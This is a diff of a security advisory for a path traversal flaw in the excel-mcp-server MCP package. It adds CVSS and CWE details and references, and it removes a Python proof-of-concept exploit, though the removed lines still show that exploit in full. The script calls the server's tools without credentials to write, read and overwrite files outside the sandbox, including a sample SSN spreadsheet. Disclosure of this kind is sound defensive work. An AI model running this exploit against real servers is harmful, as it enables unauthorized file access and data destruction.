@@ -21,6 +21,8 @@ summary: |
   | **Repository** | https://github.com/haris-musa/excel-mcp-server |
   | **Affected versions** | `<= 0.1.7` |
   | **Tested version** | `0.1.7` — commit [`de4dc75`](https://github.com/haris-musa/excel-mcp-server/commit/de4dc75f6ba629ccd2e097f5963235846be622e6) |
+  | **CWE** | [CWE-22](https://cwe.mitre.org/data/definitions/22.html) — Improper Limitation of a Pathname to a Restricted Directory |
+  | **CVSS 3.1** | **8.2 High** — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H` |
   | **Transports affected** | `sse`, `streamable-http` (network-facing) |
   | **Authentication required** | **None** |
 
@@ -102,62 +104,7 @@ summary: |
 
   The following Python script connects to the server with zero credentials and demonstrates all exploitation primitives:
 
-  ```python
-  import asyncio, os, json
-  from mcp import ClientSession
-  from mcp.client.streamable_http import streamablehttp_client
-  from openpyxl import Workbook
-
-  async def exploit():
-      async with streamablehttp_client("http://127.0.0.1:8017/mcp") as (r, w, _):
-          async with ClientSession(r, w) as s:
-              await s.initialize()
-              tools = await s.list_tools()
-              print(f"[+] {len(tools.tools)} tools exposed, ZERO auth required")
-
-              # P1: write file outside sandbox via absolute path
-              await s.call_tool("create_workbook",
-                  {"filepath": "/tmp/outside/PWNED.xlsx"})
-              assert os.path.exists("/tmp/outside/PWNED.xlsx")
-              print("[+] P1: wrote file outside sandbox (absolute path)")
-
-              # P2: write file outside sandbox via ../ traversal
-              await s.call_tool("create_workbook",
-                  {"filepath": "../outside/traversal.xlsx"})
-              print("[+] P2: escaped sandbox via ../")
-
-              # P3: create arbitrary directory tree
-              await s.call_tool("create_workbook",
-                  {"filepath": "/tmp/attacker/deep/nested/x.xlsx"})
-              assert os.path.isdir("/tmp/attacker/deep/nested")
-              print("[+] P3: created arbitrary directory tree")
-
-              # P4: read file outside sandbox
-              wb = Workbook(); ws = wb.active; ws.title = "HR"
-              ws["A1"], ws["B1"] = "SSN", "Name"
-              ws["A2"], ws["B2"] = "123-45-6789", "Alice"
-              os.makedirs("/tmp/victim", exist_ok=True)
-              wb.save("/tmp/victim/data.xlsx")
-
-              r = await s.call_tool("read_data_from_excel", {
-                  "filepath": "/tmp/victim/data.xlsx",
-                  "sheet_name": "HR",
-                  "start_cell": "A1", "end_cell": "B2"})
-              data = json.loads(r.content[0].text)
-              values = [c["value"] for c in data["cells"]]
-              assert "123-45-6789" in values
-              print(f"[+] P4: exfiltrated data: {values}")
-
-              # P5: overwrite file outside sandbox
-              await s.call_tool("write_data_to_excel", {
-                  "filepath": "/tmp/victim/data.xlsx",
-                  "sheet_name": "HR",
-                  "data": [["SSN","Name"],["DESTROYED","PWNED"]],
-                  "start_cell": "A1"})
-              print("[+] P5: overwrote victim file with attacker data")
-
-  asyncio.run(exploit())
-  ```
+  {REMOVING CAUSE FOR SAFETY CONCERNS}
 
   ### Results
 
@@ -253,6 +200,13 @@ summary: |
 
       return candidate
   ```
+
+  ## References
+
+  - [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
+  - [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+  - [Model Context Protocol Specification](https://modelcontextprotocol.io/)
+  - [FastMCP Documentation](https://github.com/jlowin/fastmcp)
 impacted_packages:
   - purl: pkg:pypi/excel-mcp-server
     affected_versions: vers:pypi/<=0.1.7
@@ -282,3 +236,6 @@ references:
   - url: https://github.com/haris-musa/excel-mcp-server/security/advisories/GHSA-j98m-w3xp-9f56
     reference_type:
     reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-40576
+    reference_type:
+    reference_id: CVE-2026-40576
